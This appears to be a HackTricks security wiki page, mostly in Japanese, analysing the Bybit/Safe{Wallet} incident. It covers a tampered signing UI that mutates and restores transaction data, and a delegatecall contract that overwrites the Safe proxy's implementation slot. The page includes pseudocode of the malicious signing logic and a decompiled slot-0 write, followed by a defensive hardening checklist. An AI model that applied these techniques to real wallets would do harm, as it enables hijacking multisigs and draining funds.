# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## 概要

コールドウォレット窃取チェーンでは、**Safe{Wallet} web UI のサプライチェーン侵害**と、**proxy の implementation pointer（slot 0）を上書きする on-chain の delegatecall primitive**が組み合わされていました。主なポイントは次のとおりです。

- dApp が signing path に code を注入できる場合、signer に**攻撃者が選択したフィールドに対する有効な EIP-712 signature**を生成させながら、元の UI data を復元して他の signer に気付かれないようにできます。
- Safe proxy は `masterCopy`（implementation）を**storage slot 0**に格納します。slot 0 に書き込む contract への delegatecall により、Safe は実質的に攻撃者の logic へ「upgrade」され、wallet の完全な control が得られます。

## Off-chain: Safe{Wallet} における targeted signing mutation

改ざんされた Safe bundle（`_app-*.js`）は、特定の Safe + signer addresses を選択的に攻撃しました。注入された logic は signing call の直前に実行されました:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### 攻撃特性
- **Context-gated**: 被害者の Safe/signers に対するハードコードされた allowlist により、ノイズを防ぎ、検知されにくくした。<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**: `signTransaction` の直前にフィールド（`to`、`data`、`operation`、gas）を上書きし、その後元に戻したため、UI 上の proposal payloads は無害に見えながら、署名は attacker payload と一致した。
- **EIP-712 opacity**: wallets は structured data を表示したが、nested calldata を decode したり、`operation = delegatecall` を強調表示したりしなかったため、mutation された message は実質的に blind-signed された。

### Gateway validation relevance
Safe proposals は **Safe Client Gateway** に送信される。hardened checks の導入前は、UI が signing 後に内容を書き換えた場合、JSON body のフィールドとは異なる `safeTxHash`/signature に対応する proposal を gateway が受け入れる可能性があった。incident 後、gateway は hash/signature が送信された transaction と一致しない proposal を拒否するようになった。同様の server-side hash verification を、あらゆる signing-orchestration API に適用すべきである。

### 2025 Bybit/Safe incident highlights
- 2025 年 2 月 21 日の Bybit cold-wallet drain（約 401k ETH）では同じ pattern が再利用された。侵害された Safe S3 bundle は Bybit signers に対してのみ trigger し、`operation=0` → `1` に切り替え、slot 0 に書き込む pre-deployed attacker contract を `to` に指定した。<sup>[[1]](#references)[[3]](#references)</sup>
- Wayback-cached `_app-52c9031bfa03da47.js` には、Bybit の Safe（`0x1db9…cf4`）と signer addresses をキーにして処理し、execution の 2 分後に clean bundle へ即座にロールバックする logic が示されている。これは「mutate → sign → restore」trick を再現している。<sup>[[1]](#references)[[2]](#references)</sup>
- malicious contract（例: `0x9622…c7242`）には、単純な functions `sweepETH/sweepERC20` と、implementation slot に書き込む `transfer(address,uint256)` が含まれていた。`execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` の実行により proxy implementation が変更され、full control が付与された。<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: Delegatecall proxy takeover via slot collision

Safe proxies は **storage slot 0** に `masterCopy` を保持し、すべての logic をそこへ delegate する。Safe は **`operation = 1` (delegatecall)** をサポートしているため、署名済みのあらゆる transaction で任意の contract を指定し、proxy の storage context 内でその code を実行できる。<sup>[[3]](#references)</sup>

attacker contract は ERC-20 の `transfer(address,uint256)` を模倣していたが、実際には `_to` を slot 0 に書き込んでいた。<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
実行経路:<sup>[[1]](#references)[[3]](#references)</sup>
1. Victims sign `execTransaction` with `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy validates signatures over these parameters.
3. Proxy delegatecalls into `attackerContract`; the `transfer` body writes slot 0.
4. Slot 0 (`masterCopy`) now points to attacker-controlled logic → **ウォレット全体の乗っ取りと資金流出**.

### Guard とバージョンに関する注意点（インシデント後のhardening）
- Safes >= v1.3.0 can install a **Guard** to veto `delegatecall` or enforce ACLs on `to`/selectors; Bybit ran v1.1.1, so no Guard hook existed. Upgrading contracts (and re-adding owners) is required to gain this control plane.

## Detection とhardening checklist

- **UI integrity**: JS assets / SRI をpinし、bundleの差分をmonitorする。signing UIをtrust boundaryの一部として扱う。
- **Sign-time validation**: **EIP-712 clear-signing**に対応したhardware walletsを使用し、`operation`を明示的にrenderしてnested calldataをdecodeする。policyで許可されていない限り、`operation = 1`の場合はsigningを拒否する。
- **Server-side hash checks**: proposalsをrelayするgateways/servicesは`safeTxHash`を再計算し、signaturesがsubmitted fieldsと一致することをvalidateする。
- **Policy/allowlists**: `to`、selectors、asset typesに対するpreflight rulesを設定し、vet済みのflowを除いてdelegatecallをdisallowする。fully signed transactionsをbroadcastする前に、internal policy serviceを必須にする。
- **Contract design**: 厳密に必要でない限り、multisig/treasury walletsでarbitrary delegatecallをexposeしない。upgrade pointersをslot 0から離すか、explicit upgrade logicとaccess controlでguardする。
- **Monitoring**: treasury fundsを保有するwalletsからのdelegatecall executions、および通常の`call` patternsから`operation`を変更するproposalsに対してalertを出す。

## References

- [1] [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [2] [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
